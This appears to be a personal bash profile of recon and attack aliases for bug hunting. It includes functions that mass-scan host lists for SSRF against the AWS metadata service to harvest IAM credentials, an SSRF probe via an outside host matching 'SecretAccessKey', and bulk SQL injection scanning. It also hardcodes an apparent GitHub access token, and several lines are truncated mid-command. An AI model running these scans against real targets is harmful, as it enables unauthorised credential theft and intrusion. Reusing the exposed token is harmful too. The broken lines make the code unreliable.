#####GO######
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
#################
if [ -s ~/.bashrc ]; then
    source ~/.bashrc;
fi
################
alias c="clear"

xd(){
cat $1 | while read line; do amass enum -passive -d $line | anew all_subs.txt ;done
}

x1(){
httpx -l $1 -silent -path '/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' -mc 200 -match>}

ssrf(){
httpx -l $1 -silent -path '/s3File?url=http://ssrf.0x0asif.xyz/' -mc 200 -match-string 'SecretAccessKey'
}

masssqli(){
waybackurls $1 | gf sqli | nuclei -t ~/nuclei-templates/sqli.yaml -o sqli_res.txt
}

aqui(){
curl -s https://crt.sh/\?O=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | a>}

crtsh(){
curl -s https://crt.sh/\?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort>echo "------------------------"
curl -s "https://crt.sh/?Identity=%."$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sor>}


s3ls(){
aws s3 ls s3://$1
}

assetfinder(){
assetfinder --subs-only $1
}

dirsearch(){
python3 ~/tools/dirsearch/dirsearch.py -u $1 -e $2 -t 50 -b
}

ipinfo(){
curl http://ipinfo.io/$1
}

linkfinder(){
python3 ~/tools/LinkFinder/linkfinder.py -i $1 -o cli
}
git-sub(){
github-subdomains -d $1 -e -q -t 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
}
stegsolve(){
cd /media/hex-box/CTF-Resources  && java -jar stegsolve.jar
}

jsview(){
cd tools/pinkerton; python3 main.py -u https://$1
}


sublist3r(){
sublist3r.py -d $1
}

phpinfo(){
python3 ~/tools/phpinfo/phpinfo.py $1
}

rs(){
cd ~/tools/;ruby resolve.rb $1
}
metric(){
python3 ~/tools/metrics/metrics.py $1
}
turbolist3r(){
python3 ~/tools/Turbolist3r/turbolist3r.py -d $1
}

x4(){
nuclei -l $1 -t ~/nuclei-templates/exposures/apis/swagger-api.yaml -o swagger.txt
}

s3enum(){
s3enum -wordlist ~/s3enum/wordlist.txt -suffixlist ~/s3enum/suffixlist.txt -threads 10 $1
}
